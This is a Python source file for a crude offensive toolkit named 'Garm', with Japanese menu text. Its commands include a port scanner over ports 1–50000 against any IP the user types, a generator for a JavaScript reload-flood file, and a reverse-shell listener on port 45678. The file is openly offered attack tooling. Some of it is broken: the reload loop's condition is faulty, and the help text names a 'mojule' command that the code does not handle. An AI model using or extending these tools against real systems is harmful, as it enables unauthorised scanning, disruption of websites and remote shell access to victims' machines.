import winsound
import socket
import requests
import platform
import os
import hashlib
from AsyncRemoteShell import ReverseShellServer
import asyncore

#起動音
winsound.Beep(234,1000)
#ようこそ画面

print("Garm")
a = input("コマンドを入力してください")

#コマンドに応じた処理
if a == "help":
    print("F5 : F5attack frameworkを実行します")
    print("myIP : 自機のホスト名を取得します")
    print("OSinfo : 自機の情報を取得します。")
    print("mojule : このプログラムに必要なモジュールをインストールします。")
    print("portscan : ポートスキャンを実施します。")
    print("webinfo : 指定されたウェブサイトから情報を取得します。")
    print("reverseserver : リバースシェルを実行します。")
    print("end : このプログラムを終了します。")

elif a == "F5":
    print("F5attack framework ver.0.0.1")
    ce = input("回数を入力してください。")
    f = open('test.js', 'w')
    f.write("for(let s = 0; s == " + ce + "; s++) {\n  location.reload();\n}");
    f.close()
    print("save as:test.js")

elif a == "myIP":
    host = socket.gethostname()
    print(host)

elif a == "OSinfo":
    print(platform.platform())
    
elif a == "modules":
    os.system('pip install requests')

elif a == "portscan":
    host = input("対象のIPアドレスを入力してください。")
    for port in range(1,50000):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        result = sock.connect_ex((host, port))
        sock.close()
        #socket.connect_ex は成功すると0を返す
        if result == 0:
            print("Port %d open!" % (port))
            
elif a == "webinfo":
    gsw = input("取得したい情報のあるウェブサイトのURLを入力してください。")
    gswe = requests.get(gsw)
    print(gswe)


elif a == "reverseserver":
    ReverseShellServer("", 45678) # interface and port is required
    asyncore.loop()

elif a == "end":
    exit() #プログラムを終了する


